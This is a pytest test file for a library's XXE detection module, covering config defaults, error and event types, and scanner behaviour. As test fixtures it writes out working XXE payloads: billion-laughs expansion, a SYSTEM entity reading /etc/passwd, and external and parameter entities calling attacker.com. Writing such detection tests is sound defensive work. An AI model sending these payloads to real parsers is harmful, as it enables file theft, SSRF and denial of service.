"""Tests for XXE protection module (Phase 1 — Foundation).

Strict TDD: tests written BEFORE implementation.
Covers config, exceptions, events, and scanner detection.
"""

from __future__ import annotations

from typing import TYPE_CHECKING

import pytest

if TYPE_CHECKING:
    from araxys.xxe.scanner import XXEScanner

# ═════════════════════════════════════════════════════════════════════════════
# T1.1 — XXEConfig Model
# ═════════════════════════════════════════════════════════════════════════════


class TestXXEConfig:
    """XXEConfig model behaves according to spec (XXE-CFG)."""

    def test_defaults(self) -> None:
        """Default XXEConfig has all protections enabled."""
        from araxys.xxe.config import XXEConfig

        config = XXEConfig()
        assert config.forbid_dtd is True
        assert config.forbid_entities is True
        assert config.forbid_external is True
        assert config.exclude_paths == [
            "/docs",
            "/redoc",
            "/openapi.json",
            "/healthz",
        ]
        assert config.exclude_content_types == []

    def test_custom_values(self) -> None:
        """XXEConfig accepts field overrides."""
        from araxys.xxe.config import XXEConfig

        config = XXEConfig(
            forbid_dtd=False,
            forbid_entities=False,
            forbid_external=False,
            exclude_paths=["/webhook"],
            exclude_content_types=["application/json"],
        )
        assert config.forbid_dtd is False
        assert config.forbid_entities is False
        assert config.forbid_external is False
        assert config.exclude_paths == ["/webhook"]
        assert config.exclude_content_types == ["application/json"]

    def test_araxys_config_xxe_field_default_none(self) -> None:
        """XXE module is disabled by default (xxe field is None)."""
        from araxys.core.config import AraxysConfig

        config = AraxysConfig(
            secret_key="test-secret-key-12345678901234567890"
        )
        assert config.xxe is None

    def test_araxys_config_xxe_field_with_config(self) -> None:
        """XXE module is enabled when xxe field is set."""
        from araxys.core.config import AraxysConfig
        from araxys.xxe.config import XXEConfig

        xxe_cfg = XXEConfig(forbid_dtd=True)
        config = AraxysConfig(
            secret_key="test-secret-key-12345678901234567890",
            xxe=xxe_cfg,
        )
        assert config.xxe is not None
        assert config.xxe.forbid_dtd is True
        assert config.xxe.forbid_entities is True

    def test_partial_override(self) -> None:
        """XXEConfig partial override keeps defaults for unspecified fields."""
        from araxys.xxe.config import XXEConfig

        config = XXEConfig(forbid_dtd=False)
        assert config.forbid_dtd is False
        assert config.forbid_entities is True  # default
        assert config.forbid_external is True  # default


# ═════════════════════════════════════════════════════════════════════════════
# T1.2 — XXEError Exception
# ═════════════════════════════════════════════════════════════════════════════


class TestXXEError:
    """XXEError behaves according to spec (XXE-ERR)."""

    def test_construction(self) -> None:
        """XXEError can be constructed with detection type and detail."""
        from araxys.xxe.exceptions import XXEError

        error = XXEError(
            detection_type="entity_expansion",
            detail="Billion laughs attack detected",
        )
        assert error.detection_type == "entity_expansion"
        assert error.detail == "Billion laughs attack detected"

    def test_inherits_araxys_error(self) -> None:
        """XXEError extends AraxysError."""
        from araxys.core.exceptions import AraxysError
        from araxys.xxe.exceptions import XXEError

        assert issubclass(XXEError, AraxysError)

    def test_str_representation(self) -> None:
        """String representation includes detection_type and detail."""
        from araxys.xxe.exceptions import XXEError

        error = XXEError(
            detection_type="external_entity",
            detail="SYSTEM file:///etc/passwd detected",
        )
        msg = str(error)
        assert "external_entity" in msg
        assert "SYSTEM" in msg or "passwd" in msg

    def test_default_detail(self) -> None:
        """XXEError defaults detail to empty string."""
        from araxys.xxe.exceptions import XXEError

        error = XXEError(detection_type="dtd")
        assert error.detail == ""


# ═════════════════════════════════════════════════════════════════════════════
# T1.3 — XXE_DETECTED Audit Event
# ═════════════════════════════════════════════════════════════════════════════


class TestXXEEvents:
    """Audit and security event types for XXE (XXE-ERR)."""

    def test_xxe_detected_in_audit_event_type(self) -> None:
        """AuditEventType has XXE_DETECTED = 'xxe_detected'."""
        from araxys.core.types import AuditEventType

        assert hasattr(AuditEventType, "XXE_DETECTED")
        assert AuditEventType.XXE_DETECTED.value == "xxe_detected"

    def test_xxe_detected_in_security_event_type(self) -> None:
        """SecurityEventType has XXE_DETECTED = 'xxe_detected'."""
        from araxys.core.types import SecurityEventType

        assert hasattr(SecurityEventType, "XXE_DETECTED")
        assert SecurityEventType.XXE_DETECTED.value == "xxe_detected"

    def test_xxe_audit_events_frozenset(self) -> None:
        """XXE_AUDIT_EVENTS frozenset contains XXE_DETECTED."""
        from araxys.core.types import AuditEventType
        from araxys.xxe.events import XXE_AUDIT_EVENTS

        assert AuditEventType.XXE_DETECTED in XXE_AUDIT_EVENTS
        assert len(XXE_AUDIT_EVENTS) == 1

    def test_xxe_security_events_frozenset(self) -> None:
        """XXE_SECURITY_EVENTS frozenset contains XXE_DETECTED."""
        from araxys.core.types import SecurityEventType
        from araxys.xxe.events import XXE_SECURITY_EVENTS

        assert SecurityEventType.XXE_DETECTED in XXE_SECURITY_EVENTS
        assert len(XXE_SECURITY_EVENTS) == 1


# ═════════════════════════════════════════════════════════════════════════════
# T1.4 — XXEScanner
# ═════════════════════════════════════════════════════════════════════════════


@pytest.fixture
def scanner() -> XXEScanner:
    """Scanner with all protections enabled (default config)."""
    from araxys.xxe.config import XXEConfig
    from araxys.xxe.scanner import XXEScanner

    return XXEScanner(XXEConfig())


class TestScanCleanXML:
    """Scanner allows clean XML through (XXE-SCAN)."""

    def test_clean_xml_passes(self, scanner: XXEScanner) -> None:
        """Simple XML without DTD/entities passes cleanly."""
        result = scanner.scan("<root><item>safe</item></root>")
        assert not result.is_threat
        assert result.threat_score == 0.0

    def test_clean_xml_with_attributes(self, scanner: XXEScanner) -> None:
        """XML with attributes but no DOCTYPE passes."""
        result = scanner.scan(
            '<root id="42"><item name="test">content</item></root>'
        )
        assert not result.is_threat

    def test_clean_xml_bytes_input(self, scanner: XXEScanner) -> None:
        """Bytes input is decoded and scanned."""
        result = scanner.scan(b"<root><item>safe</item></root>")
        assert not result.is_threat

    def test_empty_string(self, scanner: XXEScanner) -> None:
        """Empty string returns clean result (no crash)."""
        result = scanner.scan("")
        assert not result.is_threat


class TestScanXXEThreats:
    """Scanner detects various XXE attack vectors."""

    BILLION_LAUGHS = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>"""

    FILE_DISCLOSURE = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""

    SSRF = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/evil">
]>
<root>&xxe;</root>"""

    PARAM_ENTITY = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>"""

    def test_billion_laughs_detected(self, scanner: XXEScanner) -> None:
        """Billion-laughs entity expansion is detected."""
        result = scanner.scan(self.BILLION_LAUGHS)
        assert result.is_threat
        assert result.threat_score == 1.0
        assert "entity" in " ".join(result.detectors_triggered).lower()

    def test_file_disclosure_detected(self, scanner: XXEScanner) -> None:
        """External entity SYSTEM file:/// is detected."""
        result = scanner.scan(self.FILE_DISCLOSURE)
        assert result.is_threat
        triggered = " ".join(result.detectors_triggered).lower()
        assert "external" in triggered or "entity" in triggered

    def test_ssrf_detected(self, scanner: XXEScanner) -> None:
        """External entity SYSTEM http:// is detected."""
        result = scanner.scan(self.SSRF)
        assert result.is_threat

    def test_parameter_entity_detected(self, scanner: XXEScanner) -> None:
        """Parameter entity %xxe is detected."""
        result = scanner.scan(self.PARAM_ENTITY)
        assert result.is_threat

    def test_dtd_declaration_detected(self, scanner: XXEScanner) -> None:
        """DOCTYE declaration alone (no entities) is detected."""
        payload = """<?xml version="1.0"?>
<!DOCTYPE foo>
<root>test</root>"""
        result = scanner.scan(payload)
        assert result.is_threat
        assert "dtd" in " ".join(result.detectors_triggered).lower()

    def test_output_has_metadata(self, scanner: XXEScanner) -> None:
        """Threat result includes xxe_threats in metadata."""
        result = scanner.scan(self.FILE_DISCLOSURE)
        assert result.is_threat
        assert "xxe_threats" in result.metadata
        assert len(result.metadata["xxe_threats"]) > 0
        threat = result.metadata["xxe_threats"][0]
        assert "detection_type" in threat
        assert "detail" in threat

    def test_public_entity_detected(self, scanner: XXEScanner) -> None:
        """PUBLIC external entity is detected."""
        payload = """<?xml version="1.0"?>
<!DOCTYPE foo PUBLIC "-//W3C//DTD XHTML 1.0//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<root>test</root>"""
        result = scanner.scan(payload)
        assert result.is_threat

    def test_system_in_non_xml_text_not_flagged(self, scanner: XXEScanner) -> None:
        """The word SYSTEM in plain text (not entity context) is not flagged."""
        payload = "<root>The SYSTEM is ready to process</root>"
        result = scanner.scan(payload)
        assert not result.is_threat


class TestScanInvalidXML:
    """Scanner handles invalid XML without false positives."""

    def test_malformed_xml(self, scanner: XXEScanner) -> None:
        """Malformed XML (unclosed tag) returns clean, not threat."""
        result = scanner.scan("<root><item>unclosed")
        assert not result.is_threat

    def test_random_text(self, scanner: XXEScanner) -> None:
        """Non-XML text returns clean."""
        result = scanner.scan("This is just plain text, not XML.")
        assert not result.is_threat

    def test_json_string(self, scanner: XXEScanner) -> None:
        """JSON input returns clean (no false positive)."""
        result = scanner.scan('{"key": "value", "data": [1, 2, 3]}')
        assert not result.is_threat


class TestScanConfigToggling:
    """Scanner respects XXEConfig toggles (XXE-CFG)."""

    def test_forbid_dtd_false_allows_doctype(self) -> None:
        """forbid_dtd=False allows DOCTYPE declarations."""
        from araxys.xxe.config import XXEConfig
        from araxys.xxe.scanner import XXEScanner

        scanner = XXEScanner(XXEConfig(forbid_dtd=False))
        payload = """<?xml version="1.0"?>
<!DOCTYPE foo>
<root>test</root>"""
        result = scanner.scan(payload)
        assert not result.is_threat

    def test_forbid_entities_false_allows_entities(self) -> None:
        """forbid_entities=False allows entity declarations (DTD also off)."""
        from araxys.xxe.config import XXEConfig
        from araxys.xxe.scanner import XXEScanner

        scanner = XXEScanner(
            XXEConfig(forbid_dtd=False, forbid_entities=False)
        )
        payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY x "hello">
]>
<root>&x;</root>"""
        result = scanner.scan(payload)
        assert not result.is_threat

    def test_forbid_external_false_allows_system(self) -> None:
        """forbid_external=False allows SYSTEM entity (if entities also off)."""
        from araxys.xxe.config import XXEConfig
        from araxys.xxe.scanner import XXEScanner

        scanner = XXEScanner(
            XXEConfig(forbid_dtd=False, forbid_entities=False, forbid_external=False)
        )
        payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY x SYSTEM "file:///etc/passwd">
]>
<root>&x;</root>"""
        result = scanner.scan(payload)
        assert not result.is_threat

    def test_entities_still_blocked_when_only_dtd_allowed(self) -> None:
        """forbid_dtd=False but forbid_entities=True still blocks entities."""
        from araxys.xxe.config import XXEConfig
        from araxys.xxe.scanner import XXEScanner

        scanner = XXEScanner(XXEConfig(forbid_dtd=False))
        payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY x "hello">
]>
<root>&x;</root>"""
        result = scanner.scan(payload)
        assert result.is_threat

    def test_external_still_blocked_when_only_entities_allowed(self) -> None:
        """forbid_entities=False but forbid_external=True blocks SYSTEM."""
        from araxys.xxe.config import XXEConfig
        from araxys.xxe.scanner import XXEScanner

        scanner = XXEScanner(
            XXEConfig(forbid_dtd=False, forbid_entities=False)
        )
        # Without forbid_external=False, SYSTEM still blocked
        payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY x SYSTEM "file:///etc/passwd">
]>
<root>&x;</root>"""
        result = scanner.scan(payload)
        assert result.is_threat


class TestScanStdlibFallback:
    """Scanner gracefully falls back when defusedxml is absent."""

    def test_clean_xml_without_defusedxml(self) -> None:
        """Clean XML works via stdlib fallback."""
        from araxys.xxe.config import XXEConfig
        from araxys.xxe.scanner import XXEScanner

        scanner = XXEScanner(XXEConfig())
        result = scanner.scan("<root><item>safe</item></root>")
        assert not result.is_threat

    def test_malicious_detected_without_defusedxml(self) -> None:
        """Malicious XML is detected via regex pre-scan without defusedxml."""
        from araxys.xxe.config import XXEConfig
        from araxys.xxe.scanner import XXEScanner

        scanner = XXEScanner(XXEConfig())
        payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""
        result = scanner.scan(payload)
        assert result.is_threat

    def test_no_import_error_on_init(self) -> None:
        """Instantiating XXEScanner without defusedxml does not raise."""
        from araxys.xxe.config import XXEConfig
        from araxys.xxe.scanner import XXEScanner

        try:
            XXEScanner(XXEConfig())
        except ImportError:
            pytest.fail("XXEScanner raised ImportError on init")
